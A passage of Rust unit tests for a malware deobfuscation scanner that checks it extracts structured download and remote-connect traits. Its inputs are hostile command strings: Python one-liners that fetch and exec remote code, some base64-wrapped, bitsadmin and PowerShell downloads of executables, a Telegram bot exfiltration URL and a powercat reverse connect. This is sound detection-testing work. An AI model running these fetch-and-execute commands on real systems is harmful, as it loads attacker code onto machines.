                Trait::RemoteConnect { host, port, .. } if host == "1.2.3.4" && *port == 2080
            )
        });
        assert_eq!(clean_download_count, 1, "traits: {:?}", report.traits);
        assert_eq!(
            noisy_sweep_count, 0,
            "escaped quote URL double-emitted by sweep: {:?}",
            report.traits
        );
        assert!(
            has_powercat_connect,
            "powercat reverse connect not emitted: {:?}",
            report.traits
        );
    }

    #[test]
    fn deob_text_url_prefix_of_known_download_not_double_emitted() {
        let mut env = crate::env::Environment::new(&Config::default());
        env.traits.push(Trait::Download {
            cmd: "powershell".to_string(),
            src: "https://known.example/file.docx?rlkey=abc&st=def&dl=1".to_string(),
            dst: None,
        });
        crate::deob_scan::scan_deob_text(
            r#"powershell DownloadFile('https://known.example/file.docx?rlkey=abc')"#,
            &mut env,
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("known.example"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "partial prefix URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn telegram_bot_prefix_of_known_download_not_double_emitted() {
        let mut env = crate::env::Environment::new(&Config::default());
        env.traits.push(Trait::Download {
            cmd: "ps1".to_string(),
            src: "https://api.telegram.org/bot123:abc/sendMessage?chat_id=777".to_string(),
            dst: None,
        });
        crate::deob_scan::scan_deob_text(
            r#"Invoke-RestMethod -Uri ('https://api.telegram.org/bot' + $botToken + '/sendMessage?chat_id=' + $chatId)"#,
            &mut env,
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(
                    t,
                    Trait::DownloadInDeobText { src, .. }
                        if src == "https://api.telegram.org/bot"
                )
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Telegram URL prefix double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn bitsadmin_transfer_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"bitsadmin /transfer j1 /download /priority foreground "https://bits.example/a.txt" "C:\Temp\a.exe" "https://bits.example/b.txt" "C:\Temp\b.exe""#,
            &mut env,
        );
        for expected in ["https://bits.example/a.txt", "https://bits.example/b.txt"] {
            let has = env.traits.iter().any(|t| {
                matches!(t,
                    Trait::BitsadminDownload { url, .. } if url == expected
                )
            });
            assert!(
                has,
                "no structured bitsadmin download for {expected}: {:?}",
                env.traits
            );
        }
        let generic_count = env
            .traits
            .iter()
            .filter(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("bits.example")))
            .count();
        assert_eq!(
            generic_count, 0,
            "bitsadmin URLs double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn bitsadmin_liberal_url_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"bitsadmin /transfer j1 /download /priority foreground "hTtP:\\bits-liberal.example\a.txt" "C:\Temp\a.exe""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::BitsadminDownload { url, dst }
                    if url == "http://bits-liberal.example/a.txt" && dst == "C:\\Temp\\a.exe"
            )
        });
        assert!(
            has,
            "no structured liberal bitsadmin download: {:?}",
            env.traits
        );
    }

    #[test]
    fn bitsadmin_schemeless_domain_path_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"bitsadmin /transfer "mdj" /download /priority FOREGROUND "courtage-psd.com/Beopajki.exe" "%temp%\out.exe""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::BitsadminDownload { url, dst }
                    if url == "http://courtage-psd.com/Beopajki.exe" && dst == "%temp%\\out.exe"
            )
        });
        assert!(
            has,
            "no structured schemeless bitsadmin download: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_requests_get_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"start "" /min "python.exe" -c "import requests,base64; exec(base64.b64decode(requests.get('https://py.example/payload').text))""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/payload"
            )
        });
        assert!(
            has,
            "no structured Download from Python requests.get: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("py.example"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_requests_module_alias_get_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import requests as rq; exec(rq.get('https://py.example/requests-alias').text)""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/requests-alias" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python requests module alias: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/requests-alias")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python requests module alias URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_requests_get_import_alias_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "from requests import get as fetch; exec(fetch('https://py.example/requests-import-alias').text)""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/requests-import-alias" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python requests get import alias: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/requests-import-alias")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python requests get import alias URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_requests_assigned_get_alias_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import requests; fetch = requests.get; exec(fetch('https://py.example/assigned-get').text)""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/assigned-get" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python assigned requests.get alias: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/assigned-get")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python assigned requests.get alias URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_requests_get_variable_url_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import requests; u = 'https://py.example/var-get'; exec(requests.get(u).text)""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/var-get" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python requests.get variable URL: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/var-get")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python requests.get variable URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_requests_module_alias_assigned_get_alias_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import requests as rq; fetch = rq.get; exec(fetch('https://py.example/module-assigned-get').text)""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/module-assigned-get" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python assigned requests module alias get: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/module-assigned-get")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python assigned requests module alias get URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_requests_parenthesized_get_import_alias_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            "python -c \"from requests import (\n    post,\n    get as fetch,\n); exec(fetch('https://py.example/requests-paren-import').text)\"",
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/requests-paren-import" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python requests parenthesized get import alias: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/requests-paren-import")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python requests parenthesized import alias URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_requests_request_get_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import requests; exec(requests.request('GET', 'https://py.example/requests-request').text)""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/requests-request" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python requests.request GET: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/requests-request")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python requests.request GET URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_requests_request_get_variable_url_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import requests; u = 'https://py.example/request-var'; exec(requests.request('GET', u).text)""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/request-var" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python requests.request GET variable URL: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/request-var")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python requests.request GET variable URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_requests_assigned_request_alias_get_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import requests; req = requests.request; exec(req('GET', 'https://py.example/assigned-request').text)""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/assigned-request" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python assigned requests.request alias: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/assigned-request")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python assigned requests.request alias URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_requests_session_get_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import requests; exec(requests.Session().get('https://py.example/session-get').text)""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/session-get" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python requests.Session().get: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/session-get")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python requests.Session().get URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_requests_bound_session_get_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import requests; s = requests.Session(); exec(s.get('https://py.example/bound-session-get').text)""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/bound-session-get" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python bound requests.Session().get: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/bound-session-get")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python bound requests.Session().get URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_requests_module_alias_bound_session_get_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import requests as rq; s = rq.Session(); exec(s.get('https://py.example/alias-bound-session-get').text)""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/alias-bound-session-get" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python aliased bound requests.Session().get: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/alias-bound-session-get")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python aliased bound requests.Session().get URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_multiline_base64_import_alias_recurses_into_decoded_source_urls() {
        use base64::Engine;

        let payload = "import requests; requests.get('https://py.example/base64-paren-import')";
        let b64 = base64::engine::general_purpose::STANDARD.encode(payload);
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(
                "python -c \"from base64 import (\n    b64decode as dec,\n); exec(dec('{b64}'))\""
            ),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/base64-paren-import" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python multiline base64 import alias: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_urllib_urlopen_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"cmd.exe /c start "" /min C:\Users\Public\synaptics.exe -c "import urllib.request;exec(urllib.request.urlopen('https://py.example/loader').read())""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/loader"
            )
        });
        assert!(
            has,
            "no structured Download from Python urllib urlopen: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("py.example"))
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python urllib URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_urllib_urlopen_alias_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "from urllib.request import urlopen as fetch; exec(fetch('https://py.example/alias-loader').read())""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/alias-loader" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python urllib urlopen alias: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/alias-loader")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python urlopen alias URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_urllib_assigned_urlopen_alias_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import urllib.request; fetch = urllib.request.urlopen; exec(fetch('https://py.example/assigned-urlopen').read())""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/assigned-urlopen" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python assigned urllib urlopen alias: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/assigned-urlopen")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python assigned urllib urlopen alias URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_urllib_request_from_import_assigned_urlopen_alias_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "from urllib import request as req; fetch = req.urlopen; exec(fetch('https://py.example/from-import-assigned-urlopen').read())""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/from-import-assigned-urlopen" && dst.is_none()
            )
        });
        assert!(
            has,
            "no structured Download from Python urllib request from-import assigned urlopen alias: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/from-import-assigned-urlopen")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python urllib request from-import assigned urlopen alias URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_urllib_urlretrieve_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import urllib.request; urllib.request.urlretrieve('https://py.example/file.exe', 'file.exe')""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/file.exe" && dst.as_deref() == Some("file.exe")
            )
        });
        assert!(
            has,
            "no structured Download from Python urllib urlretrieve: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/file.exe")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python urlretrieve URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_urllib_urlretrieve_alias_in_deob_text_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "from urllib.request import urlretrieve as grab; grab('https://py.example/alias-file.exe', 'alias.exe')""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/alias-file.exe"
                        && dst.as_deref() == Some("alias.exe")
            )
        });
        assert!(
            has,
            "no structured Download from Python urlretrieve alias: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/alias-file.exe")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python urlretrieve alias URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_urllib_urlretrieve_variable_url_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import urllib.request; u = 'https://py.example/var-file.exe'; urllib.request.urlretrieve(u, 'var-file.exe')""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/var-file.exe"
                        && dst.as_deref() == Some("var-file.exe")
            )
        });
        assert!(
            has,
            "no structured Download from Python urlretrieve variable URL: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/var-file.exe")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python urlretrieve variable URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_urllib_urlretrieve_variable_destination_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import urllib.request; u = 'https://py.example/dst-var-file.exe'; f = 'dst-var-file.exe'; urllib.request.urlretrieve(u, f)""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/dst-var-file.exe"
                        && dst.as_deref() == Some("dst-var-file.exe")
            )
        });
        assert!(
            has,
            "no structured Download destination from Python urlretrieve variable destination: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/dst-var-file.exe")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python urlretrieve variable destination URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_urllib_urlretrieve_literal_url_variable_destination_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import urllib.request; f = 'literal-dst-var-file.exe'; urllib.request.urlretrieve('https://py.example/literal-dst-var-file.exe', f)""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/literal-dst-var-file.exe"
                        && dst.as_deref() == Some("literal-dst-var-file.exe")
            )
        });
        assert!(
            has,
            "no structured Download destination from Python urlretrieve literal URL variable destination: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/literal-dst-var-file.exe")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python urlretrieve literal URL variable destination URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_urllib_urlretrieve_reordered_keyword_args_emit_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import urllib.request; u = 'https://py.example/kw-file.exe'; f = 'kw-file.exe'; urllib.request.urlretrieve(filename=f, url=u)""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/kw-file.exe"
                        && dst.as_deref() == Some("kw-file.exe")
            )
        });
        assert!(
            has,
            "no structured Download from Python urlretrieve reordered keyword args: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/kw-file.exe")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python urlretrieve reordered keyword args URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_urllib_multiline_urlretrieve_alias_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            "python -c \"from urllib.request import (\n    urlopen,\n    urlretrieve as grab,\n); grab('https://py.example/multiline-alias-file.exe', 'multi.exe')\"",
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/multiline-alias-file.exe"
                        && dst.as_deref() == Some("multi.exe")
            )
        });
        assert!(
            has,
            "no structured Download from Python multiline urlretrieve alias: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/multiline-alias-file.exe")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python multiline urlretrieve alias URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_urllib_request_module_alias_urlretrieve_emits_structured_download() {
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            r#"python -c "import urllib.request as u; u.urlretrieve('https://py.example/module-alias-file.exe', 'module-alias.exe')""#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://py.example/module-alias-file.exe"
                        && dst.as_deref() == Some("module-alias.exe")
            )
        });
        assert!(
            has,
            "no structured Download from Python urllib.request module alias: {:?}",
            env.traits
        );
        let generic_count = env
            .traits
            .iter()
            .filter(|t| {
                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/module-alias-file.exe")
            })
            .count();
        assert_eq!(
            generic_count, 0,
            "Python urllib.request module alias URL double-emitted: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_b64decode_literal_recurses_into_decoded_source_urls() {
        use base64::Engine;

        let decoded = "import urllib.request;exec(base64.b64decode(urllib.request.urlopen('https://py.example/inner').read().decode('utf-8')))";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(r#"python.exe -c "exec(base64.b64decode('{b64}'))""#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/inner"
            )
        });
        assert!(
            has,
            "no structured Download from decoded Python b64 source: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_b64decode_raw_literal_recurses_into_decoded_source_urls() {
        use base64::Engine;

        let decoded = "import requests;requests.get('https://py.example/raw-literal-inner')";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(r#"python.exe -c "exec(base64.b64decode(r'{b64}'))""#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/raw-literal-inner"
            )
        });
        assert!(
            has,
            "no structured Download from decoded Python raw-string b64 source: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_b64decode_bound_literal_recurses_into_decoded_source_urls() {
        use base64::Engine;

        let decoded = "import requests;requests.get('https://py.example/bound-inner')";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(r#"python.exe -c "payload = '{b64}'; exec(base64.b64decode(payload))""#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/bound-inner"
            )
        });
        assert!(
            has,
            "no structured Download from decoded Python bound b64 source: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_b64decode_concat_bound_literal_recurses_into_decoded_source_urls() {
        use base64::Engine;

        let decoded = "import requests;requests.get('https://py.example/concat-bound-inner')";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let midpoint = b64.len() / 2;
        let (left, right) = b64.split_at(midpoint);
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(
                r#"python.exe -c "payload = '{left}' + '{right}'; exec(base64.b64decode(payload))""#
            ),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/concat-bound-inner"
            )
        });
        assert!(
            has,
            "no structured Download from decoded Python concatenated bound b64 source: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_b64decode_adjacent_bound_literal_recurses_into_decoded_source_urls() {
        use base64::Engine;

        let decoded = "import requests;requests.get('https://py.example/adjacent-bound-inner')";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let midpoint = b64.len() / 2;
        let (left, right) = b64.split_at(midpoint);
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(
                r#"python.exe -c "payload = '{left}' '{right}'; exec(base64.b64decode(payload))""#
            ),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/adjacent-bound-inner"
            )
        });
        assert!(
            has,
            "no structured Download from decoded Python adjacent bound b64 source: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_imported_b64decode_alias_recurses_into_decoded_source_urls() {
        use base64::Engine;

        let decoded = "import requests;requests.get('https://py.example/imported-alias-inner')";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(r#"python.exe -c "from base64 import b64decode as d; exec(d('{b64}'))""#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/imported-alias-inner"
            )
        });
        assert!(
            has,
            "no structured Download from imported Python b64 alias source: {:?}",
            env.traits
        );
    }

    #[test]
    fn python_base64_star_import_recurses_into_decoded_source_urls() {
        use base64::Engine;

        let decoded = "import requests;requests.get('https://py.example/star-import-inner')";
        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
        let mut env = crate::env::Environment::new(&Config::default());
        crate::deob_scan::scan_deob_text(
            &format!(r#"python.exe -c "from base64 import *; exec(b64decode('{b64}'))""#),
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://py.example/star-import-inner"
            )
        });
        assert!(
            has,
            "no structured Download from Python base64 star import source: {:?}",
            env.traits
        );
    }

    #[test]
